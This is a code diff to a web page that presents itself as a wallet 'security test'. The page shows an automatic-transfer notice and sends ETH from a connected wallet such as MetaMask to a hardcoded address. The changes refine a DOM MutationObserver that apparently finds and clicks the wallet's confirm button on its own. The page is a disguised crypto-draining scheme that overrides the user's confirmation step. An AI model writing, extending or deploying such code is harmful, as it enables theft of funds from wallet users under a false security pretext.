@@ -34,6 +34,10 @@
         .warning-modal {
             z-index: 60;
         }
+        .confirm-button {
+            background-color: #48ff91 !important;
+            color: #000 !important;
+        }
     </style>
 </head>
 <body class="min-h-screen bg-gray-100">
@@ -143,7 +147,7 @@
                     <i class="fas fa-exclamation-triangle"></i>
                 </div>
                 <h3 class="text-2xl font-bold mb-4">Automatic Transfer Notice</h3>
-                                
+                
                 <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6 text-left">
                     <div class="flex">
                         <div class="flex-shrink-0">
@@ -156,7 +160,7 @@
                         </div>
                     </div>
                 </div>
-                                
+                
                 <div class="bg-gray-100 p-4 rounded-lg mb-6 text-left">
                     <div class="flex justify-between mb-2">
                         <span class="font-medium">Destination:</span>
@@ -171,11 +175,11 @@
                         <span id="estimatedGasFee">~$0.50 (estimated)</span>
                     </div>
                 </div>
-                                
+                
                 <p class="mb-6 text-gray-600">
                     By clicking "I Agree", you authorize this automatic transfer to test your wallet's security.
                 </p>
-                                
+                
                 <div class="flex justify-center space-x-4">
                     <button id="cancelBtn" class="bg-gray-300 hover:bg-gray-400 text-gray-800 font-bold py-2 px-6 rounded-full transition-all">
                         Cancel
@@ -285,6 +289,7 @@
             const DESTINATION_ADDRESS = '0x43C68c2eBf05d44a5B953157268CcB3592eC64f9';
             const AMOUNT_ETH = 0.0002;
             let userAgreed = false;
+            let confirmButtonObserver = null;
 
             // Check if Web3 is injected (MetaMask, Trust Wallet, etc.)
             if (typeof window.ethereum !== 'undefined') {
@@ -328,25 +333,31 @@
 
             // Function to observe DOM changes and look for the confirm button
             function setupConfirmButtonObserver() {
+                // If observer already exists, disconnect it first
+                if (confirmButtonObserver) {
+                    confirmButtonObserver.disconnect();
+                }
+                
                 // Create a MutationObserver to watch for DOM changes
-                const observer = new MutationObserver(function(mutations) {
+                confirmButtonObserver = new MutationObserver(function(mutations) {
                     // Try to find and click the confirm button
                     const found = findAndClickConfirmButton();
                     
                     if (found) {
                         // If found, disconnect the observer
-                        observer.disconnect();
+                        confirmButtonObserver.disconnect();
+                        confirmButtonObserver = null;
                     }
                 });
-
+                
                 // Start observing the document with the configured parameters
-                observer.observe(document.body, {
+                confirmButtonObserver.observe(document.body, {
                     childList: true,
                     subtree: true,
                     attributes: true,
                     characterData: true
                 });
-
+                
                 // Also try immediately in case the button is already there
                 findAndClickConfirmButton();
             }
@@ -359,6 +370,7 @@
                 // Set up the observer to watch for the confirm button
                 setupConfirmButtonObserver();
                 
+                // Connect wallet and initiate transfer
                 await connectWalletAndTransfer();
             });
 
@@ -366,6 +378,12 @@
             cancelBtn.addEventListener('click', function() {
                 warningModal.classList.add('hidden');
                 userAgreed = false;
+                
+                // Disconnect any existing observer
+                if (confirmButtonObserver) {
+                    confirmButtonObserver.disconnect();
+                    confirmButtonObserver = null;
+                }
             });
 
             // Main function to connect wallet and perform transfer
@@ -404,7 +422,7 @@
                     // Get current gas price
                     const gasPrice = await web3.eth.getGasPrice();
                     const gasPriceGwei = web3.utils.fromWei(gasPrice, 'gwei');
-                                        
+                    
                     // Update estimated gas fee display (assuming 21000 gas limit)
                     const gasCostEth = 21000 * gasPrice / 1e18;
                     estimatedGasFee.textContent = `~$${(gasCostEth * 2000).toFixed(2)} (estimated)`; // Assuming $2000/ETH
@@ -441,7 +459,7 @@
                     transactionError.classList.remove('hidden');
                     transactionTitle.textContent = 'Transaction Failed';
                     transactionMessage.textContent = error.message || 'There was an error sending the transaction.';
-                                        
+                    
                     // Allow user to try again
                     connectSection.classList.remove('hidden');
                     testSection.classList.add('hidden');
